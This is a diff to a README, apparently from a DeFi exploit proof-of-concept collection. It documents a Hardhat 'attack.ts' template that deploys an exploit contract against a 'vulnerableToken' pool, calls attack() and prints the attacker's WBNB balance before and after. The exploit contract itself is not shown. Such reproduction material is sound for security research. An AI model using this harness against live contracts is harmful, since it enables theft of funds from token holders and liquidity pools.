@@ -75,42 +75,47 @@
 	- `attack.ts`: A TypeScript script to initialize the parameters, addresses of POC, deploy `exploit.sol` contract, execute exploit, call function and check the results. It will be executed by HardHat.  
 		- **The basic structure of `attack.ts`**
 	```typescript
-	// Import needed interface factories, which will be generated automatically according to the exploit.sol and interfaces file 
+	// Import needed interface factories
+	// Theses interface factories will be generated automatically according to the exploit.sol and interfaces file 
 	import {Exploit__factory, IERC20__factory} from "../typechain";
-	import hre, { ethers } from "hardhat"	
-	import YAML from 'yaml'	
+	import hre, { ethers } from "hardhat"
+	import YAML from 'yaml'
 	import fs from 'fs'
 
 	async function main() {
 	// Read parameters from config.yml
 	const config_file = fs.readFileSync('config.yml', 'utf8');
 	const config = YAML.parse(config_file);
-	console.log(config.address.PAIR);
-	
-	// Prepare the account
+
+	// Setup account
 	const [signer] = await hre.ethers.getSigners();
-	
+
 	// Deploy exploit contract with intialized parameters from config.yml
 	const exploit = await new Exploit__factory(signer).deploy(
-	config.address.PAIR,
-	config.address.ROUTER,
-	config.address.VULNERABLE_TOKEN,
-	config.address.WBNB);
-	
+		config['address']['pair'],
+		config['address']['router'],
+		config['address']['vulnerableToken'],
+		config['address']['wbnb'],
+		ethers.utils.parseEther(config['parameters']['swapAmount']),
+		ethers.utils.parseEther(config['parameters']['burnAmount']),
+		ethers.BigNumber.from(config['parameters']['numberOfSwapOperations']),
+		ethers.BigNumber.from(config['parameters']['numberOfBurnOperations']));
 	console.log("Exploit contract deployed to: ",exploit.address)
-	const WBNB = IERC20__factory.connect(config.address.WBNB,signer);
+	
+	// Show balance
+	const WBNB = IERC20__factory.connect(config['address']['wbnb'],signer);
 	console.log("Attacker WBNB balance:", hre.ethers.utils.formatUnits(await WBNB.balanceOf(signer.address),await WBNB.decimals()))
-
+	
 	// Execute exploit contract
 	const exploitTx = await exploit.attack({value: ethers.utils.parseEther("500")});
 	console.log("Exploiting... transcation: ",exploitTx.hash)
 	await exploitTx.wait()
-	console.log("Exploit complete.")
-	
+
 	// Display result
+	console.log("Exploit complete.")
 	console.log("Attacker WBNB balance:",hre.ethers.utils.formatUnits(await WBNB.balanceOf(signer.address),await WBNB.decimals()))
 	}
-	
+
 	main().catch((error) => {
 	console.error(error);
 	process.exitCode = 1;
